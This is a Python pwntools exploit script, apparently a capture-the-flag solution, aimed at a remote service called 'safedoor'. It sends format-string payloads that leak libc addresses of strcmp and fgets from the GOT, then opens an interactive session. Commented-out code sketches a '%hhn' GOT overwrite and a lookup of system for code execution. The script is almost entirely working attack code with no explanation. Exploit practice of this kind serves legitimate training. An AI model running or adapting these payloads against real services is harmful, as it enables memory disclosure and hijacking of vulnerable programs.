from pwn import *
context(log_level="debug")
# p = process('./safedoor')
p = remote('219.146.15.117',8000)
elf = ELF('safedoor')
strcmp_got = elf.got['strcmp']
fgets_got  = elf.got['fgets']
# call_eax = 0x80484f6

p.recvuntil('KEY:')
m_p = 0x0804858D

# gdb.attach(p,'b* 0x0804864E\nc')
# def leak(addr):	
payload = p32(strcmp_got)+"%4$s..."
p.sendline(payload)
p.recvuntil('ERROR:')
data = p.recvuntil('...')[4:8]
strcmp_libc = u32(data)
print "strcmp_got = "+hex(strcmp_libc)


payload = p32(fgets_got)+"%4$s..."
p.sendline(payload)
p.recvuntil('ERROR:')
data = p.recvuntil('...')[4:8]
fgets_libc = u32(data)
print "fgets_got = "+hex(fgets_libc)
# d = DynELF(leak, elf=ELF('./safedoor'))
 
# system_addr = d.lookup('system', 'libc')

p.interactive()
# for x in range(2):
# 	l = (m_p >> (x*8)) &0xff
# 	payload = p32(puts_got+x)+"%%%dc"%(l-4)+"%4$hhn..."
# 	p.sendline(payload)
# 	p.recvuntil('...')
# l = (m_p >> (2*8)) &0xff
# payload = p32(puts_got+2)+"%4$hhn..."
# p.sendline(payload)
# p.recvuntil('...')

# l = (m_p >> (3*8)) &0xff
# payload = p32(puts_got+3)+"%%%dc"%(l-4)+"%4$hhn..."
# p.sendline(payload)
# p.recvuntil('...')